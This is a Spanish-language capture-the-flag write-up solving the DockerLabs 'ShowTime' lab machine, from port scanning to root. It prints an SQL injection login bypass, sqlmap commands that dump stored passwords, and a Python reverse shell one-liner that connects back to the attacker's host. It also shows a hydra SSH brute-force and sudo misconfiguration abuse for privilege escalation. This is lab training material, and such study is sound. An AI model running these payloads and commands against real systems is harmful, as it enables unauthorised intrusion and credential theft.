#MAQUINA #DOCKERLABS #FACIL 
#SQLI #RCE
#SQLMAP
<hr>
# RECONOCIMIENTO

Vamos a resolver **ShowTime** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS --min-rate 5000 -vvv -n -Pn -p- 172.17.0.2 --open
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-05 12:46 CET
Initiating ARP Ping Scan at 12:46
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 12:46, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:46
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 22/tcp on 172.17.0.2
Completed SYN Stealth Scan at 12:46, 0.50s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2024-12-05 12:46:42 CET for 1s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.69 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)

```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **80(HTTP)** y el puerto **22(SSH)** abiertos.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p22,80 172.17.0.2                            
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-05 12:47 CET
Nmap scan report for pressenter.hl (172.17.0.2)
Host is up (0.000018s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e1:9a:9f:b3:17:be:3d:2e:12:05:0f:a4:61:c3:b3:76 (ECDSA)
|_  256 69:8f:5c:4f:14:b0:4d:b6:b7:59:34:4d:b9:03:40:75 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: cs
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.41 seconds



```

   ```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-05 12:47 CET
Nmap scan report for pressenter.hl (172.17.0.2)
Host is up (0.0000030s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
| http-enum: 
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.58 (ubuntu)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.58 (ubuntu)'
|_  /js/: Potentially interesting directory w/ listing on 'apache/2.4.58 (ubuntu)'
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds


```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.
# EXPLOTACION

Al revisar la web que hay en el puerto 80, vemos que hay un login. 
Al meter una contra cualquiera y meterle como usuario -> **a' or 1=1 -- -** , nos deja pasar, por lo que es vulnerable a un SQLI, vamos a automatizarlo usando **sqlmap**

   ```bash

sqlmap -u "http://172.17.0.2/login_page/" --batch --forms --dbs

available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] users

sqlmap -u "http://172.17.0.2/login_page/" --batch --forms -D users --tables

Database: users
[1 table]
+----------+
| usuarios |
+----------+

sqlmap -u "http://172.17.0.2/login_page/" --batch --forms -D users -T usuarios --dump

Database: users
Table: usuarios
[3 entries]
+----+----------------------+----------+
| id | password             | username |
+----+----------------------+----------+
| 1  | 123321123321         | lucas    |
| 2  | 123456123456         | santiago |
| 3  | MiClaveEsInhackeable | joe      |
+----+----------------------+----------+


```

**joe : MiClaveEsInhackeable** -> llama la atención, vamos a probar con estas credenciales.

En ssh no van, pero en la web si, ahora nos sale un ejecutor de comandos en python.

Nos ponemos en escucha por el puerto 443 y ejecutamos :

   ```bash
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.17.0.1",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")

```

# ESCALADA PRIVILEGIOS

Vemos que hay un archivo en **/tmp** , puede ser la contra de joe , por lo que pasamos a minúsculas y probamos con hydra:
   ```bash
cat contras | sed 's/.*/\L&/' > contras_min
hydra -l joe -P contras_min ssh://172.17.0.2 -t 64
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-05 13:20:35
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 79 login tries (l:1/p:79), ~2 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: joe   password: chittychittybangbang
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 22 final worker threads did not complete until end.
[ERROR] 22 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-12-05 13:20:38

```

YA ESTAMOS COMO JOE.

Buscamos archivos con permisos SUDO:
   ```bash
joe@085a9a248e65:~$ sudo -l
Matching Defaults entries for joe on 085a9a248e65:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User joe may run the following commands on 085a9a248e65:
    (luciano) NOPASSWD: /bin/posh

```

Vemos **posh** con permisos SUID :
   ```bash
joe@085a9a248e65:~$ sudo -u luciano posh
$ whoami
luciano

```

YA ESTAMOS COMO LUCIANO.


Buscamos archivos con permisos SUDO:
   ```bash
luciano@085a9a248e65:~$ sudo -l
Matching Defaults entries for luciano on 085a9a248e65:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User luciano may run the following commands on 085a9a248e65:
    (root) NOPASSWD: /bin/bash /home/luciano/script.sh

```

Vemos **/home/luciano/script.sh** con permisos SUDO ejecutandolo con /bin/bash :
   ```bash
luciano@085a9a248e65:~$ cat script.sh 
bash -p
luciano@085a9a248e65:~$ sudo /bin/bash /home/luciano/script.sh 
root@085a9a248e65:/home/luciano# whoami
root
root@085a9a248e65:/home/luciano# 
```

**YA ESTAMOS COMO ROOT.**